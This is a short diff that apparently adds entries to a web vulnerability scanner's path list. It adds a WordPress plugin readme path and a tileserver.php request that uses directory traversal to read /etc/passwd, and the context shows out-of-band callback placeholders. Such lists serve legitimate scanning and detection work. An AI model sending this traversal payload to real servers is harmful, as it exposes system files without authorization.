@@ -9038,3 +9038,5 @@ test&access={{interactsh-url}}&remote_url={{interactsh-url}}&admin={{interactsh-
 /wp-content/plugins/wt-smart-coupons-for-woocommerce/readme.txt
 /wp-content/plugins/captcha-eu/readme.txt
 /wp-content/plugins/ghl-wizard/readme.txt
+/wp-content/plugins/ova-events-manager/readme.txt
+/tileserver.php/x/1/1/1?Format=/../../../../../../../../../../../../../../etc/passwd&Request=x&layer=.
